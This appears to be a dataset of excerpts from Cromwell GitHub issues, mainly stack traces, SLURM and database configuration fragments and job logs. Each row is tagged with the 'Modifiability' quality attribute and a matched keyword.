Modifiability,"p.cwl; in:; input_files: fastqc_input_files; output_dir: fastqc_mkdir/created_directory; thread_count: fastqc_thread_count; out: [output_directory]; multiqc_mkdir:; run: mkdir-cmd.cwl; in:; directory: multiqc_output_dir; out: [created_directory]; multiqc_execute:; run: multiqc-cmd.cwl; in:; output_dir: multiqc_mkdir/created_directory; input_dir: fastqc_execute/output_directory; out: [output_directory]; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more. <!-- SLURM backend configuration -->; include required(classpath(""application"")). backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String queue = ""cpu""; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). # exit-code-timeout-seconds = 120. submit = ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560:1513,config,config,1513,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560,1,['config'],['config']
Modifiability,"p.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable.parse(Parseable.java:299); 	at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:689); 	at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:2059,Config,ConfigDocumentParser,2059,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['Config'],['ConfigDocumentParser']
Modifiability,"p; oints.split.001.fa.cdna.psl missing; Failure for defuse command:; /usr/local/bin/gmap -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a; -ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa > /cromwell-executions/detectFusions/96242; 9bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa.cdna.psl.tmp; Reason:; Job command with nonzero return code; Return codes: 139; Job output:; Running on 2ecb3961d54d; Note: /usr/local/bin/gmap.avx2 does not exist. For faster speed, may want to compile package on an AVX2 machine; GMAP version 2018-07-04 called with args: /usr/local/bin/gmap.sse42 -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa; Checking compiler assumptions for SSE2: 6B8B4567 327B23C6 xor=59F066A1; Checking compiler assumptions for SSE4.1: -103 -58 max=198 => compiler zero extends; Checking compiler options for SSE4.2: 6B8B4567 __builtin_clz=1 __builtin_ctz=0 _mm_popcnt_u32=17 __builtin_popcount=17 ; Finished checking compiler assumptions; Pre-loading compressed genome (oligos)......done (78,222,840 bytes, 19098 pages, 0.00 sec); Pre-loading compressed genome (bits)......done (78,222,864 bytes, 19098 pages, 0.02 sec); Looking for index files in directory defuse-data/gmap/cdna; Pointers file is cdna.ref153offsets64meta; Offsets file is cdna.ref153offsets64strm; Positions file is cdna.ref153positions; Offsets compression type: bitpack64; Allocating memory for ref offset pointers, kmer 15, interval 3...Attached existing memory (2 attached) for defuse-data/gmap/cdna/cdna.ref153offsets64meta...done (134,217,744 bytes, 0.00 sec); Allocating memory for ref offsets, kmer 15, interval 3...Attached new memory for defuse-data/gmap/cdna/cdna.ref153offsets64strm...done (234,475,312 bytes, 0.23 sec); Pre-loading ref positions, kmer 15, interval 3......done (276,173,052 by",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465:1479,extend,extends,1479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465,1,['extend'],['extends']
Modifiability,parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable.parse(Parseable.java:299); 	at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:689); 	at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:51); 	at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:473); 	at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:259); 	at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:256); 	at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:65); 	at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:92); 	at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:256); 	at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:232); 	at cromwell.CromwellEntryPoint$.config$lzycompute(CromwellEntryPoint.scala:39); 	at cromwell.CromwellEntryPoint$.config(CromwellEntryPoint.scala:39); 	at cromwell.Crom,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:2774,config,config,2774,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['config'],['config']
Modifiability,pass with a warning message if no secure environment variables,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3103:53,variab,variables,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3103,1,['variab'],['variables']
Modifiability,"patch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2018-06-13 14:29:47,368 cromwell-system-akka.dispatchers.engine-dispatcher-5 INFO - WorkflowExecutionActor-a67833cb-b894-4790-872f-9f3104cab60c [UUID(a67833cb)]: Starting demux_only.illumina_demux; 2018-06-13 14:29:48,004 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - Failed to hash /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4; cromwell.core.path.PathParsingException: java.lang.IllegalArgumentException: /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4 exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: s3. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathFactory$.$anonfun$buildPath$4(PathFactory.scala:47); 	at scala.Option.getOrElse(Option.scala:121); 	at cromwell.core.path.PathFactory$.buildPath(PathFactory.scala:42); 	at cromwell.core.path.PathFactory.buildPath(PathFactory.scala:29); 	at cromwell.core.path.PathFactory.buildPath$(PathFactory.scala:29); 	at cromwell.backend.impl.aws.AwsBatchWorkflowPaths.buildPath(AwsBatchWorkflowPaths.scala:51); 	at cromwell.backend.io.WorkflowPaths.$anonfun$getPath$1(WorkflowPaths.scala:43); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.io.WorkflowPaths.getPath(WorkflowPaths.scala:43); 	at cromwell.backend.io.WorkflowPaths.getPath$(WorkflowPaths.scala:43); 	at cromwell.backend.impl.aws.AwsBatchWorkflowPaths.getPath(AwsBatchWorkflowPaths.scala:51); 	at cromwell.backend.standard.StandardCachingActorHelper.getPath(StandardCachingActorHelper.scala:41); 	at c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:5400,config,configure,5400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['config'],['configure']
Modifiability,"patchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecuti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:3158,Config,ConfigAsyncJobExecutionActor,3158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,pl$MultiInsertAction.run(JdbcActionComponent.scala:526); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:30); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:27); 	at slick.dbio.DBIOAction$$anon$4.$anonfun$run$3(DBIOAction.scala:239); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:239); 	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:237); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4(DBIOAction.scala:533); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4$adapted(DBIOAction.scala:533); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.run(DBIOAction.scala:533); 	at slick.dbio.SynchronousDatabaseAction$$anon$11.run(DBIOAction.scala:570); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:745); ```; The Cromwell configuration is:; ```; ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3607:4933,adapt,adapted,4933,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3607,1,['adapt'],['adapted']
Modifiability,pl$MultiInsertAction.run(JdbcActionComponent.scala:527); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:31); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:28); 	at slick.dbio.DBIOAction$$anon$4.$anonfun$run$3(DBIOAction.scala:240); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:240); 	at slick.dbio.DBIOAction$$anon$4.run(DBIOAction.scala:238); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4(DBIOAction.scala:534); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.$anonfun$run$4$adapted(DBIOAction.scala:534); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at slick.dbio.SynchronousDatabaseAction$FusedAndThenAction.run(DBIOAction.scala:534); 	at slick.dbio.SynchronousDatabaseAction$$anon$11.run(DBIOAction.scala:571); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:240); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:240); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: org.hsqldb.HsqlException: java.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:4592,adapt,adapted,4592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,2,['adapt'],['adapted']
Modifiability,"pl.Parseable.parseValue(Parseable.java:190); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:152); at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:185); ... 48 more; Caused by: java.io.IOException: resource not found on classpath: application.conf; at com.typesafe.config.impl.Parseable$ParseableResources.rawParseValue(Parseable.java:726); at com.typesafe.config.impl.Parseable$ParseableResources.rawParseValue(Parseable.java:701); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); ... 51 more; ```. <!-- Which backend are you running? -->. The backend I'm running on is slurm and local . <!-- Paste/Attach your workflow if possible: -->. Workflow link. <!-- Def not an joke about best practices. Also thanks for publishing the gatk best practices and the warp pipelines -->. https://github.com/mmterpstra/Bestie. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Below are the first few lines of the config shown. ```; #see also https://cromwell.readthedocs.io/en/stable/backends/SLURM/; # include the application.conf at the top; include required(classpath(""application"")); workflow-options {; workflow-failure-mode = ContinueWhilePossible; delete_intermediate_output_files = true; final_workflow_outputs_dir = ""cromwell-results"",; use_relative_output_paths = true,; final_workflow_log_dir = ""cromwell-logs"",; final_call_logs_dir = ""cromwell-call_logs""; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=50000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 120000; numThreads = 1; }; }; backend {; default = ""Loca",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:5714,config,configuration,5714,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['config'],['configuration']
Modifiability,pl.java:46); at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:223); at sun.nio.ch.IOUtil.read(IOUtil.java:197); at sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:159); - locked <0x00000006c54b2e78> (a java.lang.Object); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); - locked <0x00000006c54b2ec8> (a sun.nio.ch.ChannelInputStream); at org.apache.commons.codec.digest.DigestUtils.updateDigest(DigestUtils.java:798); at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.util.TryWithResource$$anonfun$tryWithResource$1.apply(TryWithResource.scala:16); at scala.util.Try$.apply(Try.scala:192); at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:47); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at scala.Option.map(Option.scala:146); a,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1597:1495,Config,ConfigHashingStrategy,1495,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1597,1,['Config'],['ConfigHashingStrategy']
Modifiability,"ple releases tested version 86 and 85). ; Tested to not be affected version 79/56. Main error below. Should be an easy fix. . ```; Exception in thread ""main"" com.typesafe.config.ConfigException$IO: application: application.conf: java.io.IOException: resource not found on classpath: application.conf, application.json: java.io.IOException: resource not found on classpath: application.json, application.properties: java.io.IOException: resource not found on classpath: application.properties; at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:236); at com.typesafe.config.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:1564,Config,ConfigParser,1564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigParser']
Modifiability,ply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.Exception: Failed command instantiation; at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:576); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:511); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:319); at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:318); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$Backgrou,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:2670,config,config,2670,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,1,['config'],['config']
Modifiability,ply(Task.scala:107); 	at scala.util.Try$.apply(Try.scala:192); 	at wdl4s.Task.instantiateCommand(Task.scala:107); 	at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor$class.writeTaskScript(ConfigAsyncJobExecutionActor.scala:55); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor$class.processArgs(ConfigAsyncJobExecutionActor.scala:39); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.executeScript(SharedFileSystemAsyncJobExecutionActor.scala:220); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeScript(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$executeOrRecover$2.apply(SharedFileSystemAsyncJobExecutionActor.scala:192); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$executeOrRecover$2.apply(SharedFileSystemAsyncJobExecutionActor.scala:189); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.executeOrRecover(SharedFileSystemAsyncJobExecutionActor.scala:188); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:124); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:45); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1765:3205,Config,ConfigAsyncJobExecutionActor,3205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1765,1,['Config'],['ConfigAsyncJobExecutionActor']
